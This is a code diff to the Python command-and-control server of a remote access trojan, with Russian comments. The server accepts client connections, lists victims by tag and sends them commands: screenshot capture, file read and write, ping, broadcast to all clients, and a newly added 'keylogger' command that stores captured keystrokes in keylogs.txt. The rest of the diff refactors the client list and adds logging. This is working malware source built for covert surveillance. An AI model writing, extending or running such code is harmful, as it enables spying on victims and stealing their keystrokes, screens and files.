@@ -4,6 +4,8 @@ import asyncio
 from time import sleep
 
 import logging
+
+from bs4 import Tag
 logger = logging.getLogger('logger')
 
 logger.setLevel(logging.DEBUG)
@@ -70,12 +72,10 @@ def help_command():
 class ManyServers:
     """Класс Сервера, который позволяет оперировать с множеством подключений к клиентам."""
 # public:
-    def __init__(self, notificator: Notificator =None):
+    def __init__(self, notificator: Notificator = None):
         # import config
         # server = Server(config.SERVER_IP, config.SERVER_PORT)
-        # список тегов активных серверов
-        self.__servers_count: list[int] = []
-        self.__servers_ips = {}
+        self.__servers: list[Server] = []
         # менеджер для доставки уведомлений во внешний интерфейс
         self.notificator: Notificator = notificator if notificator is not None else Notificator()
         # мониторинг новых запросов на подключение со стороны клиентов
@@ -86,14 +86,15 @@ class ManyServers:
     def view_all_servers(self):
         """Возвращает список активных подключений"""
         s = ""
-        for i in self.__servers_ips.keys():
-            print(self.__servers_count)
-            s = s + str(i) + ". " + str(self.__servers_ips[i][0]) + "\n"
+        for i in range(len(self.__servers)):
+            s = s + str(i) + ". " + str(self.__servers[i].tag) + "\n"
+            logger.info(f"подключен клиент с ip {str(self.__servers[i].tag)} и тегом {str(i)}")
         if s == "":
             s = "нет подключенных клиентов в данный момент"
         return s
     
     async def make_command_to_server(self, command, time_limit=20):
+        logger.info(f"выполняется команда {command}")
         # останавливает поток(и) с выполнение команды
         stop_flag = [False]
         res = "Выполнение не уложилось во временной лимит, однако оно продолжится на клиенте"
@@ -108,7 +109,6 @@ class ManyServers:
             nonlocal self
             nonlocal command
             nonlocal stop_flag
-            logger.debug(f"make_command_to_server, command={command}")
             # @todo many tags
             # @todo async execution
             # извлечение тега из сообщения
@@ -122,6 +122,7 @@ class ManyServers:
             if len(command.split()) == 1:
                 res = "Укажите команду!"
                 return res
+            logger.debug(f"make_command_to_server, command={command}, tag={tag}")
             def one_server(command):
                 nonlocal res
                 nonlocal self
@@ -133,30 +134,34 @@ class ManyServers:
                     t_tag = int(tag)
                 except ValueError:
                     res = f"некорректный тег: {t_tag}"
+                    logger.debug(f"one_server incorrect tag: {t_tag}")
                     return res
                 # проверка наличия подключения с полученным тегом
-                if self.__servers_ips.get(t_tag, "no") == "no":
+                if t_tag > len(self.__servers):
                     res = f"нет подключения с тегом: {t_tag}"
+                    logger.debug(f"has not connection with tag: {t_tag}")
                     return res
                 # проверка занятости клиента другим запросом
-                elif self.__servers_ips[t_tag][1].in_process:
+                elif self.__servers[t_tag].in_process:
                     res = f"{t_tag} клиент занят выполнением другой задачи"
+                    logger.debug(f"client with tag: {t_tag} already have task")
                     return res
                 # выполнение запроса определенным клиентом
                 else:
                     command = command.split()[1:]
-                    res = self.__servers_ips[t_tag][1].step(command, stop_flag=stop_flag)
+                    res = self.__servers[t_tag].step(command, stop_flag=stop_flag)
                     if res == "Клиент отключен -_-":
-                        self.__servers_ips.pop(t_tag)
-                        self.__servers_count.pop(int(t_tag))
+                        logger.debug(f"client with tag {t_tag} have been shoted down")
+                        self.__servers.pop(t_tag)
                         res = "соеденение закрыто"
                     return res
             # обработка сценария с тегом all
             if tag == "all":
+                logger.info(f"scenario all, command={command}")
                 s_res = [command[1]]
                 # проход по всем подключенным клиентам
-                for i in zip(self.__servers_ips.values(), range(len(self.__servers_ips.keys()))):
-                    ser: Server = i[0][1]
+                for i in zip(self.__servers, range(len(self.__servers))):
+                    ser: Server = i[0]
                     # проверка занятости клиента другим запросом
                     if ser.in_process:
                         continue
@@ -178,7 +183,7 @@ class ManyServers:
                 break
         stop_flag[0] = True
         if res == "Выполнение не уложилось во временной лимит, однако оно продолжится на клиенте":
-            self.__servers_ips[tag][1].in_process = False
+            self.__servers[tag].in_process = False
             await asyncio.sleep(2)
         return res
 
@@ -189,14 +194,6 @@ class ManyServers:
         while True:
             res = asyncio.run(self.make_command_to_server("all ping"))
             sleep(5)
-
-    def __add_server_to_count(self):
-        i = 0
-        while True:
-            if i not in self.__servers_count:
-                self.__servers_count.append(i)
-                return i
-            i += 1
     
     def __connection_monitor(self):
         """Мониторинг новых подключений, если появляется запрос от нового клиента, принимает его"""
@@ -204,10 +201,11 @@ class ManyServers:
         # принятие запроса на подключение от клиента
         server = Server(config.SERVER_IP, config.SERVER_PORT)
         # добавление нового подключения в список всех подключений
-        self.__servers_ips.update({self.__add_server_to_count(): [server.tag, server]})
+        self.__servers.append(server)
         # уведомление о подключении нового клиента во внешнюю среду
         text = "подключен новый клиент" + str(server.tag)
         self.notificator.make_notification(text)
+        logger.info(f"подключен клиент {str(server.tag)}")
         # повторный вызов для бесконечного мониторинга
         self.__connection_monitor()
     
@@ -245,6 +243,8 @@ class Server:
                 result = self.__writeFile(command[1], result)
             elif command[0] == "screenshot" and "[-] Error" not in result:
                 result = self.__screenshot(result)
+            elif command[0] == "keylogger":
+                result = self.send_doc(result)
             elif command[0] == "ratHelp":
                 result = help_command()
             elif command[0] == "ping":
@@ -254,7 +254,7 @@ class Server:
                 self.in_process = False
                 return "Клиент отключен -_-"
         except Exception as err:
-            logger.debug(err)
+            logger.debug(f"execution error: \n {err}")
             print(err)
             result = "ошибка выполнения команды, проверьте синтаксис"
         self.in_process = False
@@ -267,7 +267,7 @@ class Server:
         self.__send_json(command)
         if command[0] == "exit":
             self.connection.close()
-            exit()
+            return "Клиент отключен -_-"
         return self.__receive_json(stop_flag=stop_flag)
 
     # чтение файла
@@ -289,6 +289,12 @@ class Server:
         with open("screen.png", "wb") as file:
             file.write(base64.b64decode(content))
         return ("screen",)
+
+    def send_doc(self, content):
+        with open("keylogs.txt", "w") as file:
+            file.write(content)
+        print("документ сохранен")
+        return ("doc",)
     
     # Отправка json-данных клиенту
     def __send_json(self, data):
